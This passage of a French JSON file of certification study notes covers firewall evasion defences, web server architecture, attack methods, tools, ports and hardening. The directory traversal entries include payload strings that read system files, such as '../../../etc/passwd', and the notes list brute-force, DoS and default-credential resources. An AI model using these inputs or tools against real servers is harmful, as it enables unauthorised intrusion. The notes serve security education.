régulièrement les logs","desc":"Les journaux de pare-feu doivent être examinés et les entrées anormales investiguées. Une règle correcte mais jamais supervisée laisse passer des signes d’évasion sans réaction."},{"name":"Auditer le ruleset","desc":"Effectuer des revues et risk queries régulières permet de repérer règles obsolètes, trop permissives ou contradictoires qui créent des chemins inattendus."},{"name":"Contrôler les changements de configuration","desc":"Limiter les personnes autorisées à modifier le firewall, notifier l’administrateur de sécurité et documenter chaque changement réduit les erreurs et modifications non tracées."},{"name":"Sauvegarder règles & configuration","desc":"Des backups réguliers permettent de restaurer rapidement une politique saine après erreur, incident ou modification malveillante."},{"name":"Sécurité physique du firewall","desc":"Le contrôle logique ne suffit pas si l’équipement peut être modifié physiquement. Restreindre l’accès au matériel protège directement la configuration et les interfaces."},{"name":"Zero Trust","desc":"Le module recommande de ne pas accorder une confiance implicite au trafic interne. Les décisions d’accès doivent rester contrôlées pour les communications internes comme externes."},{"name":"Geo-restriction","desc":"Lorsque le besoin métier le permet, le filtrage géographique réduit l’exposition à des sources ou zones qui ne devraient pas communiquer avec le service."},{"name":"Rules based on user behavior","desc":"Compléter le filtrage purement IP par des règles fondées sur le comportement utilisateur permet de tenir compte du contexte et des anomalies plutôt que de faire confiance à une adresse seule."}]},{"g":"BITS, Endpoint & NAC Defense","items":[{"name":"Monitorer le BITS Client Event Log","desc":"Les événements BITS doivent être collectés et surveillés afin de repérer des jobs inhabituels, des sources externes suspectes ou des commandes de notification anormales."},{"name":"Intégrer BITS au SIEM","desc":"La corrélation des événements BITS avec d’autres logs permet de distinguer un transfert de mise à jour normal d’une séquence inhabituelle associée à une tentative de persistance ou de contournement."},{"name":"GPO pour contrôler BITS","desc":"Des stratégies de groupe peuvent encadrer l’usage de BITS, limiter certains paramètres et réduire la possibilité pour des comptes ordinaires d’en détourner les jobs."},{"name":"Limiter l’âge maximal des jobs BITS","desc":"Les jobs persistants trop longtemps augmentent la fenêtre d’abus. Le module recommande de limiter leur durée et d’auditer régulièrement les jobs existants."},{"name":"Restreindre qui peut créer des jobs BITS","desc":"Réduire les privilèges nécessaires et les comptes autorisés limite la capacité d’un utilisateur compromis à transformer BITS en canal de transfert ou de persistance."},{"name":"Désactiver la négociation DTP inutile","desc":"Le scénario de NAC bypass dépend de ports laissés en dynamic auto/desirable. Éviter cette négociation automatique sur les ports qui n’ont pas besoin de trunk réduit le risque de VLAN hopping."},{"name":"Application Control robuste","desc":"Le whitelisting doit tenir compte des binaires légitimes capables de charger ou exécuter du contenu externe. Autoriser un lanceur sans surveiller son comportement laisse une voie de contournement."},{"name":"Surveillance comportementale EDR","desc":"Les techniques de process injection, direct syscalls ou chiffrement mémoire cherchent précisément à éviter les signatures simples. Une défense doit donc corréler comportement, mémoire, appels système et relations entre processus."}]},{"g":"Honeypot & Deception Defense","items":[{"name":"Choisir le niveau d’interaction","desc":"Un low-interaction réduit le risque et la maintenance mais collecte moins d’informations. Un environnement plus interactif fournit davantage de renseignement mais exige davantage d’isolation et de surveillance."},{"name":"Isoler les honeypots","desc":"Un leurre doit être placé de façon à ce qu’une compromission ne fournisse pas un chemin direct vers les actifs réels. La segmentation et les choke points permettent de contrôler ce qui peut sortir du système leurre."},{"name":"Centraliser la journalisation","desc":"L’intérêt d’un honeypot repose sur la qualité de ses traces. Les événements doivent être conservés hors du leurre et corrélés pour éviter que l’attaquant puisse effacer facilement les preuves."},{"name":"Honeynet pour observer les mouvements","desc":"Plusieurs leurres reliés permettent de comprendre non seulement l’accès initial, mais aussi les choix de mouvement et d’exploration de l’attaquant à travers une fausse topologie."},{"name":"Tar Pit pour ralentir","desc":"Un tar pit cherche à faire perdre du temps à l’attaquant et à prolonger l’observation, tout en protégeant les systèmes réellement utiles."}]},{"g":"Architecture défendable & réponse","items":[{"name":"Logging centralisé","desc":"Sans logs, ni détection fiable ni investigation. La collecte centralisée protège mieux les preuves et rend possible la recherche transversale entre plusieurs équipements."},{"name":"NetFlow pour la visibilité","desc":"Les résumés de flux permettent d’identifier des communications inhabituelles, tunnels, volumes anormaux ou nouvelles relations entre hôtes sans conserver chaque octet de chaque paquet."},{"name":"SIEM & corrélation","desc":"Un SIEM organise et corrèle les événements provenant des IDS, firewalls, endpoints et autres sources afin de transformer des signaux isolés en alertes exploitables."},{"name":"Runbooks & Playbooks","desc":"Les réponses doivent être documentées et répétables. Un playbook lie l’événement détecté aux actions attendues selon les actifs critiques et le risque métier."},{"name":"Event vs Incident","desc":"Un event est un fait détectable ; un incident est un événement qui viole la politique de l’organisation. La distinction évite de traiter chaque événement technique comme une compromission.","exam":"Event = détectable ; Incident = violation de politique."},{"name":"Segmentation","desc":"Segmenter en amont permet de contenir une compromission et de réduire les chemins de contournement. L’isolation devient alors un changement de règles plutôt qu’une refonte d’urgence."},{"name":"Isolation","desc":"Lorsqu’un système est compromis ou suspect, couper ou restreindre ses communications limite la propagation et donne du temps à l’investigation."},{"name":"Choke Points","desc":"Prévoir des points de contrôle où le trafic peut être bloqué, redirigé ou inspecté permet une réponse rapide quand une tentative d’évasion est détectée."},{"name":"Defense in Depth + Breadth","desc":"Combiner plusieurs couches de contrôle avec une couverture des personnes, processus, applications et réseau évite de dépendre d’un seul produit ou d’un seul emplacement de défense."}]}]}}},{"n":13,"t":"Hacking de serveurs web","data":{"concept":{"groups":[{"g":"Architecture & composants du serveur web","items":[{"name":"Serveur web — rôle","desc":"Un serveur web reçoit les requêtes HTTP/HTTPS d’un client et renvoie des ressources. Il peut servir directement du contenu statique ou transmettre une requête dynamique à un serveur d’applications, puis renvoyer au client la réponse produite.","exam":"Web server = couche HTTP exposée au client ; application server = logique métier derrière lui."},{"name":"Flux client → web server → backend","desc":"Le client échange des requêtes/réponses HTTP avec le serveur web. Pour une ressource statique, le serveur lit le contenu dans son stockage de fichiers. Pour une ressource dynamique, il peut transmettre la requête à un serveur d’applications qui consulte ensuite un datastore applicatif.","exam":"Distinguer contenu statique, serveur web, serveur d’applications et datastore."},{"name":"Document Root","desc":"Répertoire racine contenant les fichiers publiés pour un site : HTML, images, scripts et autres ressources accessibles par URL. Une erreur de permissions ou de validation peut permettre de sortir de cette racine et d’atteindre des fichiers qui ne devraient pas être servis.","exam":"Document Root = contenu du site exposé au Web."},{"name":"Server Root","desc":"Répertoire de plus haut niveau de l’installation du serveur web. Il contient les éléments nécessaires au fonctionnement du service : configuration, logs et exécutables. Il doit être davantage protégé que le contenu public du Document Root.","exam":"Server Root ≠ Document Root."},{"name":"conf / logs / cgi-bin","desc":"`conf` contient les fichiers de configuration, `logs` les journaux d’accès/erreurs et `cgi-bin` les scripts ou exécutables CGI côté serveur. Une exposition ou des permissions excessives sur ces répertoires peut révéler des informations sensibles ou fournir une surface d’attaque."},{"name":"CGI","desc":"Common Gateway Interface permet au serveur web d’exécuter un programme ou script côté serveur pour générer une réponse dynamique. Les scripts CGI mal conçus ou mal protégés peuvent introduire des failles d’exécution, de validation ou de permissions."},{"name":"Serveur d’applications","desc":"Le serveur d’applications héberge la logique métier et traite les requêtes dynamiques reçues depuis le serveur web. Il peut accéder à des bases de données ou à d’autres services internes qui ne devraient pas être exposés directement à Internet."},{"name":"MVC — où se situe le serveur web","desc":"Dans une architecture MVC, la View correspond à l’interface utilisée par le client, le Controller reçoit les requêtes et décide du traitement, tandis que le Model représente les données. Le serveur web gère la couche HTTP et peut relayer vers un serveur d’applications qui exécute la logique métier.","exam":"View = client ; Controller = traitement HTTP/routage ; Model = données."},{"name":"Contenu statique vs dynamique","desc":"Un fichier statique est lu et renvoyé tel quel depuis le stockage du serveur. Un contenu dynamique est généré à partir d’une logique applicative, éventuellement avec des données d’une base. Les protections ne sont donc pas identiques : fichiers, serveur web, application et base ont chacun leur surface d’attaque."},{"name":"NGINX — Master Process","desc":"Le processus maître NGINX lit et valide la configuration, crée et ferme les sockets puis gère les worker processes. Il orchestre le service mais ne traite pas directement chaque requête utilisateur comme un worker."},{"name":"NGINX — Worker Processes","desc":"Les workers NGINX traitent les requêtes clientes avec un modèle non bloquant et mono-thread. Chaque worker peut gérer de nombreuses connexions simultanées, ce qui explique l’architecture orientée événements de NGINX."},{"name":"NGINX — Proxy Cache","desc":"Le proxy cache conserve des copies de contenus demandés pour éviter de solliciter systématiquement les backends. Un Cache Loader charge les métadonnées au démarrage et un Cache Manager supprime périodiquement les éléments expirés."},{"name":"NGINX — Backends","desc":"NGINX peut transmettre des requêtes vers plusieurs types de backends, notamment un autre serveur web, un serveur d’applications ou un serveur Memcache, via HTTP, FastCGI ou des mécanismes de cache."}]},{"g":"Surface d’attaque & organisation de la sécurité","items":[{"name":"7 niveaux de sécurité — vue d’ensemble","desc":"La sécurité d’un service Web ne se limite pas au serveur lui-même. La pile comprend : sécurité réseau, réseau, système d’exploitation, base de données, serveur web, composants tiers et application métier. Une faiblesse à un niveau peut compromettre les niveaux supérieurs.","exam":"Stack 1 Security → 2 Network → 3 OS → 4 Database → 5 Web Server → 6 Third-party → 7 Custom Web App."},{"name":"Stack 1 — Security","desc":"Couche de contrôle comprenant notamment IDS/IPS. Elle vise à détecter ou bloquer certains comportements malveillants avant qu’ils n’atteignent les systèmes exposés.","xref":[12]},{"name":"Stack 2 — Network","desc":"Routeurs, switches et segmentation transportent le trafic vers le serveur. Une mauvaise architecture ou des règles trop permissives peuvent exposer directement des services internes."},{"name":"Stack 3 — Operating System","desc":"Windows, Linux ou macOS fournissent les services, permissions, comptes et mécanismes de sécurité sur lesquels repose le serveur web. Une faille ou mauvaise configuration du système peut compromettre tout le service."},{"name":"Stack 4 — Database","desc":"La base de données contient les données persistantes. Elle devrait être séparée du serveur Web exposé, avec des comptes et privilèges minimaux."},{"name":"Stack 5 — Web Server","desc":"Apache, IIS, NGINX ou autre serveur HTTP constitue la couche directement exposée aux requêtes Internet. Configuration, modules, permissions et correctifs sont donc critiques."},{"name":"Stack 6 — Third-party Components","desc":"Bibliothèques, modules et composants open source/commerciaux ajoutent du code et des dépendances. Un composant inutile, obsolète ou vulnérable augmente la surface d’attaque."},{"name":"Stack 7 — Custom Web Applications","desc":"La logique métier et le code développé sur mesure se trouvent au sommet de la pile. Les défauts de logique, de validation et de contrôle d’accès appartiennent davantage à la sécurité applicative.","xref":[14]},{"name":"Pourquoi le serveur web reste une cible","desc":"Les contrôles réseau et système peuvent réduire certaines attaques, mais le serveur web doit rester accessible depuis Internet pour remplir son rôle. Cette exposition rend ses services, sa configuration et ses applications particulièrement intéressants pour un attaquant."},{"name":"Objectifs d’une compromission Web Server","desc":"Une compromission peut viser le vol de credentials ou de cartes, l’accès à une base, l’intégration dans un botnet, la récupération d’applications privées, la redirection de trafic ou l’élévation de privilèges."},{"name":"Point de vue Webmaster","desc":"Le serveur web peut devenir un point d’entrée vers le LAN ou l’intranet. Les scripts CGI et autres composants côté serveur doivent être considérés comme du code pouvant contenir des vulnérabilités."},{"name":"Point de vue Network Administrator","desc":"Un serveur mal configuré peut ouvrir des chemins vers le réseau interne. L’administrateur doit trouver l’équilibre entre l’accessibilité nécessaire au service et un filtrage suffisamment restrictif."},{"name":"Point de vue End User","desc":"La navigation peut sembler passive et sans risque, mais du contenu actif tel que JavaScript ou WebAssembly peut exposer l’utilisateur à des comportements malveillants ou à des téléchargements indésirables."},{"name":"Mauvaises permissions","desc":"Des permissions de fichiers ou de répertoires trop larges peuvent permettre la lecture, la modification ou l’exécution de ressources qui devraient être réservées au serveur ou à l’administration."},{"name":"Default Settings / Default Accounts","desc":"Les paramètres, comptes et mots de passe par défaut sont souvent connus publiquement. Les conserver réduit fortement l’effort nécessaire pour compromettre l’administration ou découvrir des fonctions non prévues pour Internet."},{"name":"Services & modules inutiles","desc":"Chaque service, module, extension ou mapping supplémentaire ajoute du code et des points d’entrée. Une configuration minimale réduit à la fois les vulnérabilités et la complexité de supervision."},{"name":"Debug / administration exposés","desc":"Les fonctions de debug, pages de statut, interfaces d’administration distante et messages d’erreur détaillés peuvent révéler la configuration ou permettre des actions privilégiées lorsqu’ils restent accessibles en production."},{"name":"SSL/TLS mal configuré","desc":"Certificats expirés, auto-signés par défaut, non fiables ou mauvaise configuration du chiffrement affaiblissent la confiance dans le service et peuvent faciliter l’interception ou les erreurs de validation."}]},{"g":"Attaques contre les serveurs web","items":[{"name":"DNS Server Hijacking","desc":"L’attaquant compromet le serveur DNS ou ses paramètres et modifie la résolution d’un domaine pour rediriger les utilisateurs vers une infrastructure malveillante. Le navigateur demande le bon nom, mais reçoit une mauvaise adresse IP.","exam":"DNS hijacking = modifier le mapping DNS pour rediriger les utilisateurs."},{"name":"DNS Amplification","desc":"Des requêtes DNS sont envoyées avec l’adresse IP de la victime usurpée. Les serveurs récursifs ou réflecteurs renvoient des réponses plus volumineuses vers la victime, ce qui transforme de petites requêtes en trafic de DDoS amplifié.","exam":"Petite requête DNS + source spoofée → grosse réponse vers la victime.","xref":[10]},{"name":"Directory Traversal","desc":"L’attaquant manipule un chemin avec `../` ou une variante encodée pour remonter hors du Document Root et atteindre des fichiers normalement inaccessibles. La vulnérabilité apparaît lorsque le serveur ou l’application accepte un chemin utilisateur sans validation suffisante.","syntax":"../../../etc/passwd","exam":"`../` = remonter d’un niveau dans l’arborescence."},{"name":"Traversal encodé","desc":"Les caractères d’un chemin peuvent être encodés pour contourner un filtrage insuffisant. L’exemple du cours utilise `%5c` pour représenter un séparateur Windows dans une tentative de sortie du répertoire publié.","syntax":"/scripts/..%5c../Windows/System32/"},{"name":"Forced Browsing","desc":"Le fait qu’une ressource ne soit pas liée dans l’interface ne signifie pas qu’elle est protégée. Le forced browsing consiste à demander directement des chemins probables tels que `/admin`, `/backup`, `/config.php` ou `/.env` pour découvrir des ressources présentes sur le serveur.","xref":[14]},{"name":"Web Server Misconfiguration","desc":"Une mauvaise configuration peut exposer des pages de statut, répertoires, scripts d’exemple, comptes par défaut, fonctions d’administration ou services inutiles. L’attaque ne dépend pas nécessairement d’un bug : la faiblesse vient du déploiement."},{"name":"Apache server-status exposé","desc":"Une directive Apache trop permissive autour de `/server-status` peut rendre accessibles des informations sur l’activité et l’état du serveur. Une page de diagnostic ne doit pas être exposée sans restriction."},{"name":"NGINX — unsafe variable usage","desc":"L’utilisation directe d’une donnée contrôlée par l’utilisateur dans une directive comme `proxy_pass` peut provoquer des redirections ou accès inattendus au backend si la configuration ne limite pas correctement les valeurs."},{"name":"IIS Directory Browsing","desc":"Lorsque `directoryBrowse` est activé, un client peut obtenir la liste des fichiers d’un répertoire en l’absence de page d’index. Cela peut révéler des fichiers de configuration, sauvegardes ou autres ressources non destinées à être découvertes."},{"name":"HTTP Response Splitting","desc":"Une entrée non filtrée contenant des séparateurs d’en-tête peut amener le serveur à produire deux réponses HTTP au lieu d’une. La seconde réponse peut ensuite être interprétée par une autre requête ou un cache, créant une confusion entre utilisateurs.","exam":"Response Splitting = une entrée provoque DEUX réponses HTTP."},{"name":"CRLF Injection","desc":"Les en-têtes HTTP sont séparés par des séquences de fin de ligne. Si une application place directement une entrée utilisateur dans un en-tête ou un cookie sans validation, des caractères de contrôle peuvent permettre de terminer un en-tête puis d’en injecter un autre."},{"name":"Web Cache Poisoning","desc":"L’attaquant provoque la mise en cache d’une réponse spécialement construite afin que de futurs utilisateurs reçoivent un contenu malveillant ou une redirection à la place de la ressource légitime.","exam":"Cache poisoning = le cache stocke une réponse contrôlée par l’attaquant."},{"name":"MITM / Sniffing","desc":"Un attaquant positionné sur le chemin réseau peut observer ou modifier les échanges lorsque les communications ne sont pas correctement protégées. HTTPS/TLS réduit ce risque en chiffrant et authentifiant la connexion.","xref":[8,11]},{"name":"Phishing via infrastructure Web","desc":"Un serveur compromis ou imité peut héberger une page destinée à collecter des identifiants. L’attaque repose sur la tromperie de l’utilisateur et la capacité à présenter une interface crédible.","xref":[9]},{"name":"Website Defacement","desc":"Le defacement consiste à modifier le contenu visible d’un site après compromission du serveur ou de ses fichiers. Il démontre généralement une capacité d’écriture sur le contenu publié et porte atteinte à l’intégrité du site."},{"name":"SSH Brute Force","desc":"Lorsqu’un service SSH d’administration est exposé, des tentatives répétées de credentials peuvent viser à obtenir un accès système. L’attaque cible l’authentification du serveur plutôt que la logique HTTP."},{"name":"Web Server Password Cracking","desc":"Les comptes d’administration ou services peuvent être visés par des attaques dictionnaire, brute-force ou hybrides. Les identifiants par défaut sont particulièrement dangereux lorsqu’ils n’ont pas été modifiés."},{"name":"DoS / DDoS contre un serveur Web","desc":"Une saturation du réseau, de la pile protocolaire ou des ressources applicatives peut rendre le serveur indisponible sans nécessairement obtenir d’accès. Les techniques détaillées de DoS/DDoS sont traitées séparément.","xref":[10]}]},{"g":"Méthodologie d’attaque du serveur web","items":[{"name":"6 étapes — vue d’ensemble","desc":"La méthodologie suit six étapes : Information Gathering → Web Server Footprinting → Website Mirroring → Vulnerability Scanning → Session Hijacking → Web Server Passwords Hacking. Elle fait progresser l’analyse de la découverte jusqu’aux tentatives d’accès.","exam":"Ordre CEH : Gathering → Footprinting → Mirroring → Vuln Scan → Session Hijacking → Password Hacking."},{"name":"1 — Information Gathering","desc":"Collecter les informations publiques sur la cible : domaine, IP, ASN, sous-domaines et données accessibles via services de registre ou sources Internet. L’objectif est de comprendre l’infrastructure avant tout contact plus intrusif."},{"name":"2 — Web Server Footprinting","desc":"Identifier les ports, services, capacités d’accès distant, technologies et autres caractéristiques du serveur Web. La bannière HTTP, les réponses réseau et les fichiers publics peuvent révéler des informations utiles."},{"name":"robots.txt","desc":"`robots.txt` indique aux robots d’indexation quels chemins ne devraient pas être parcourus. Il ne constitue pas un contrôle d’accès : les chemins `Disallow` peuvent au contraire révéler des répertoires intéressants."},{"name":"Banner Grabbing HTTP","desc":"Une requête HTTP simple peut révéler des en-têtes et parfois la technologie du serveur. Une requête `HEAD / HTTP/1.1` permet d’obtenir les en-têtes sans demander le corps complet de la ressource.","syntax":"nc -v <IP> 80\nHEAD / HTTP/1.1\nHost: <IP>"},{"name":"3 — Website Mirroring","desc":"Copier localement un site permet de parcourir sa structure hors ligne, d’examiner les ressources, chemins et références internes et de comprendre plus rapidement l’organisation du contenu."},{"name":"4 — Vulnerability Scanning","desc":"Des scanners automatisés recherchent des versions vulnérables, mauvaises configurations et faiblesses connues. Les résultats doivent être interprétés et, lorsque nécessaire, validés pour distinguer les findings réellement exploitables.","xref":[5]},{"name":"5 — Session Hijacking","desc":"La méthodologie inclut la compromission de sessions valides par prédiction de token, replay, fixation, sidejacking ou capture de cookies via XSS. Le détail des mécanismes de session hijacking est traité séparément.","xref":[11]},{"name":"Burp Sequencer — rôle","desc":"Le Sequencer de Burp Suite sert à examiner la qualité et l’aléa de tokens de session générés par une application. Un token insuffisamment aléatoire peut faciliter une attaque de prédiction de session."},{"name":"6 — Web Server Passwords Hacking","desc":"Tester des mots de passe vise les comptes d’administration ou d’accès distant. Les méthodes citées sont brute-force, dictionnaire et hybride ; la présence de credentials par défaut rend l’attaque beaucoup plus simple."},{"name":"Default Credentials Research","desc":"Avant de tenter de nombreuses combinaisons, rechercher les identifiants par défaut d’un produit peut révéler un accès encore non modifié. Les bases de credentials par défaut servent à associer un produit ou modèle à ses valeurs d’usine."}]},{"g":"Protection HTTP & architecture défensive","items":[{"name":"WAF","desc":"Un Web Application Firewall inspecte les requêtes HTTP au niveau applicatif et applique des règles de détection ou de blocage. Il ajoute une couche de protection, mais ne remplace ni le hardening du serveur ni la correction du code."},{"name":"mod_security","desc":"mod_security est un module WAF open source utilisé avec Apache. Il peut examiner les en-têtes et corps des requêtes/réponses selon plusieurs phases puis journaliser les événements.","exam":"WAF = couche supplémentaire ; son efficacité dépend de ses règles."},{"name":"Phases mod_security","desc":"Le traitement décrit cinq phases : 1) request headers, 2) request body, 3) response headers, 4) response body, 5) logging. Cette séparation permet d’appliquer des règles à différents moments du cycle HTTP.","exam":"1 req headers → 2 req body → 3 resp headers → 4 resp body → 5 logging."},{"name":"Input Validation pour les chemins","desc":"Toute valeur utilisée pour construire un chemin de fichier, une redirection ou une ressource doit être contrôlée côté serveur. Bloquer uniquement une chaîne littérale n’est pas suffisant si des variantes encodées ou normalisées aboutissent au même chemin."},{"name":"DMZ","desc":"Une DMZ isole les systèmes exposés à Internet du réseau interne. Les serveurs Web, DNS ou mail accessibles publiquement peuvent y être placés afin qu’une compromission ne donne pas un accès direct au réseau interne.","exam":"Internet → Firewall → DMZ → Firewall → Internal Network."},{"name":"Serveur Web dédié","desc":"Limiter le serveur à son rôle Web réduit les dépendances et les services inutiles. Les bases de données ou applications internes devraient être placées sur des systèmes séparés avec des flux réseau explicitement autorisés."},{"name":"Defense in Depth appliquée au Web","desc":"La protection d’un serveur Web combine plusieurs couches : filtrage réseau, durcissement OS, configuration du serveur, TLS, WAF, contrôles d’accès, logs et segmentation. Une seule couche ne doit pas être considérée comme suffisante."}]}]},"outil":{"groups":[{"g":"Reconnaissance & footprinting","items":[{"name":"who.is","desc":"Service de recherche WHOIS utilisé pour récupérer des informations liées à un domaine et à son enregistrement."},{"name":"Whois Lookup","desc":"Outil/service de recherche WHOIS cité pour l’Information Gathering d’un serveur Web."},{"name":"Domain Dossier","desc":"Service cité pour regrouper des informations de domaine, IP et réseau pendant la phase de reconnaissance."},{"name":"Subdomain Finder","desc":"Outil/service cité pour identifier des sous-domaines et étendre la cartographie de l’infrastructure Web."},{"name":"Netcat (nc)","desc":"Utilitaire réseau utilisé ici pour ouvrir une connexion TCP vers le port HTTP et envoyer manuellement une requête `HEAD`, utile pour observer les en-têtes et effectuer du banner grabbing.","syntax":"nc -v <IP> 80\nHEAD / HTTP/1.1\nHost: <IP>","cheat":[{"title":"Commande","words":1,"rows":[["-v","Mode verbeux."],["<IP> 80","Connexion TCP vers le service HTTP cible."],["HEAD / HTTP/1.1","Demande uniquement les en-têtes de la ressource `/`."],["Host: <IP>","En-tête Host requis par HTTP/1.1 dans de nombreux cas."]]}]},{"name":"robots.txt","desc":"Fichier public à examiner pendant le footprinting. Les directives `Disallow` peuvent révéler des chemins que l’administrateur ne souhaite pas voir indexés ; ce n’est pas un mécanisme d’autorisation."}]},{"g":"Découverte de contenu & protections Web","items":[{"name":"dirb","desc":"Outil de forced browsing/directory discovery : envoie des requêtes vers des noms de fichiers et répertoires probables afin d’identifier des ressources présentes mais non liées dans l’interface.","xref":[14]},{"name":"gobuster","desc":"Outil de découverte de chemins cité pour le forced browsing. Il automatise les requêtes vers une liste de noms afin de trouver des ressources cachées ou non indexées.","xref":[14]},{"name":"mod_security","desc":"Module WAF open source pour Apache. Il inspecte le trafic HTTP à plusieurs phases et applique des règles pour détecter ou bloquer des motifs malveillants.","cheat":[{"title":"Phases","words":1,"rows":[["1","Request headers"],["2","Request body"],["3","Response headers"],["4","Response body"],["5","Logging"]]}]}]},{"g":"Sessions & interception","items":[{"name":"Burp Suite — Sequencer","desc":"Le module Sequencer analyse la qualité de tokens de session et aide à repérer une génération trop prévisible.","xref":[11,14]},{"name":"JHijack","desc":"Outil cité pour les attaques de session hijacking contre des services Web.","xref":[11]},{"name":"Ettercap","desc":"Outil MITM/sniffing cité dans le contexte de session hijacking et d’interception réseau.","xref":[8,11]}]},{"g":"Password attacks & credential research","items":[{"name":"THC Hydra","desc":"Outil cité pour tester des combinaisons d’identifiants contre des services réseau. Dans ce module, il est associé aux attaques de mots de passe de serveurs Web et services d’administration."},{"name":"cirt.net","desc":"Base citée pour rechercher des mots de passe, credentials et ports par défaut associés à des produits."},{"name":"fortypoundhead.com","desc":"Source citée pour rechercher des identifiants par défaut."},{"name":"defaultpassword.com","desc":"Source citée pour rechercher des credentials par défaut."},{"name":"default-password.info","desc":"Source citée pour rechercher des credentials par défaut."},{"name":"routerpasswords.com","desc":"Source citée pour rechercher des identifiants d’usine de routeurs et équipements."}]},{"g":"Scanners & frameworks d’attaque","items":[{"name":"Immunity CANVAS","desc":"Framework d’exploitation cité parmi les outils d’attaque de serveurs Web."},{"name":"OpenVAS","desc":"Scanner de vulnérabilités utilisé pour rechercher des faiblesses et mauvaises configurations sur les services exposés.","xref":[5]},{"name":"HULK DoS","desc":"Outil cité pour générer du trafic HTTP de type DoS contre un service Web.","xref":[10]},{"name":"MPack","desc":"Outil/kit d’attaque cité parmi les outils associés aux attaques de serveurs Web."}]},{"g":"Hardening, patching & administration","items":[{"name":"GFI LanGuard","desc":"Solution de gestion des correctifs qui scanne le réseau, identifie les patches manquants et peut déployer des mises à jour sur Windows, macOS, Linux et des applications tierces. Le support mentionne aussi l’auto-download et le rollback."},{"name":"Symantec Client Management Suite","desc":"Solution de gestion et patch management citée pour maintenir les systèmes à jour."},{"name":"SolarWinds Patch Manager","desc":"Outil cité pour gérer et déployer des correctifs."},{"name":"Kaseya Patch Management","desc":"Solution de patch management citée pour automatiser la maintenance des systèmes."},{"name":"Software Vulnerability Manager (Flexera)","desc":"Solution citée pour le suivi des vulnérabilités logicielles et des correctifs."},{"name":"Ivanti Patch for Endpoint Manager","desc":"Outil de patch management cité pour la gestion des endpoints."},{"name":"OpenVPN","desc":"Solution VPN citée pour sécuriser l’accès d’administration à des plateformes composées de plusieurs serveurs."},{"name":"KeePass","desc":"Gestionnaire de mots de passe cité pour appliquer une gestion plus sûre des credentials d’administration."}]}]},"port":{"groups":[{"g":"Services Web principaux","items":[{"name":"80 / TCP — HTTP","desc":"Port HTTP à autoriser lorsqu’un service Web non chiffré est réellement nécessaire. Les contre-mesures recommandent de limiter l’exposition aux services Web requis et de rediriger le trafic vers HTTPS lorsque possible.","tr":"tcp"},{"name":"443 / TCP — HTTPS","desc":"Port HTTP protégé par TLS. Il doit être privilégié pour les communications sensibles et peut constituer l’un des seuls ports entrants nécessaires à un serveur Web public.","tr":"tcp"},{"name":"HTTP","desc":"Protocole requête/réponse entre client et serveur Web. Les méthodes, en-têtes, statuts, cookies et caches font partie de la surface d’attaque du service."},{"name":"HTTPS","desc":"HTTP transporté dans un canal TLS. Il apporte chiffrement, intégrité et authentification du serveur lorsqu’un certificat valide est correctement vérifié."},{"name":"HTTP HEAD","desc":"Méthode HTTP qui demande les en-têtes d’une ressource sans son corps. Elle peut être utilisée pour observer le comportement et certains en-têtes du serveur pendant le footprinting.","syntax":"HEAD / HTTP/1.1"},{"name":"HSTS","desc":"HTTP Strict Transport Security est un en-tête qui demande au navigateur de n’utiliser que des connexions HTTPS pour le domaine, afin de réduire les attaques de downgrade vers HTTP.","exam":"HSTS = forcer HTTPS côté navigateur."}]},{"g":"Administration & transfert","items":[{"name":"22 / TCP — SSH","desc":"Port standard de SSH. Un SSH d’administration exposé peut être visé par des attaques de credentials ; l’accès doit être restreint et protégé.","tr":"tcp"},{"name":"22 / TCP — SFTP","desc":"SFTP utilise SSH pour transférer des fichiers de façon chiffrée. Il est recommandé à la place de FTP pour les transferts sensibles.","tr":"tcp"},{"name":"21 / TCP — FTP","desc":"Port de contrôle FTP. FTP ne protège pas nativement les identifiants et les données ; le module recommande SFTP lorsqu’un transfert sécurisé est nécessaire.","tr":"tcp"},{"name":"OpenVPN","desc":"Protocole/solution VPN cité pour protéger les accès entre plusieurs serveurs ou environnements d’administration."}]},{"g":"DNS & sécurité du nommage","items":[{"name":"53 — DNS","desc":"DNS résout les noms de domaine vers des adresses. Une compromission de la résolution peut rediriger les utilisateurs ; le service peut aussi être utilisé comme réflecteur/amplificateur dans un DDoS.","xref":[2,10]},{"name":"DNSSEC","desc":"Extensions de sécurité DNS qui ajoutent une validation cryptographique des données DNS afin d’aider à détecter des réponses falsifiées ou modifiées.","exam":"DNSSEC protège l’intégrité/authenticité DNS ; ce n’est pas du chiffrement de contenu."}]},{"g":"Composants HTTP & backend","items":[{"name":"TLS / SSL","desc":"TLS protège HTTPS. Les certificats doivent être valides, non révoqués et chaînés vers une autorité racine de confiance. SSL est l’ancien terme encore présent dans certains libellés du cours."},{"name":"CRLF","desc":"Carriage Return + Line Feed délimite les lignes d’en-têtes HTTP. Une entrée utilisateur non filtrée dans un en-tête peut permettre une injection CRLF et contribuer à un HTTP Response Splitting."},{"name":"CGI","desc":"Interface permettant au serveur Web d’exécuter un programme ou script pour générer du contenu dynamique."},{"name":"FastCGI","desc":"Mécanisme cité dans l’architecture NGINX pour transmettre des requêtes à un backend applicatif."},{"name":"Memcache","desc":"Service de cache cité comme backend possible dans l’architecture NGINX afin de réduire le coût d’accès aux ressources."}]}]},"contre":{"groups":[{"g":"Architecture réseau & exposition","items":[{"name":"Segmenter Internet / DMZ / Interne","desc":"Placer les serveurs publics dans un segment sécurisé séparé du réseau interne. Une architecture type utilise Internet → firewall externe → DMZ → firewall interne → réseau interne.","exam":"3 segments : Internet, DMZ, Internal Network."},{"name":"Base de données sur serveur séparé","desc":"Le backend de base de données ne doit pas être installé sur le même serveur Web lorsque l’architecture permet de le séparer. Seuls les flux nécessaires entre Web/App et DB doivent être autorisés."},{"name":"Serveur Web dédié","desc":"Utiliser une machine dédiée pour le rôle Web afin de limiter les services, comptes et dépendances présents sur le système exposé."},{"name":"Ne pas installer IIS sur un Domain Controller","desc":"Éviter de combiner le rôle de serveur Web IIS et le rôle de contrôleur de domaine. Une compromission du service Web ne doit pas exposer directement les fonctions critiques d’Active Directory."},{"name":"Durcir avant exposition Internet","desc":"Le serveur doit être configuré, patché, audité et durci avant d’être connecté directement à Internet."},{"name":"Protection physique","desc":"Le serveur physique doit être installé dans une zone sécurisée afin qu’un accès local ne permette pas de contourner les contrôles réseau et système."},{"name":"URL mappings internes prudents","desc":"Toute publication ou redirection vers des serveurs internes doit être conçue avec prudence pour éviter d’exposer involontairement des ressources du réseau interne."}]},{"g":"Ports, services & fonctionnalités","items":[{"name":"Auditer régulièrement les ports","desc":"Vérifier que seuls les services nécessaires sont en écoute. Un port oublié peut exposer une interface d’administration ou un protocole non sécurisé."},{"name":"Limiter l’inbound à 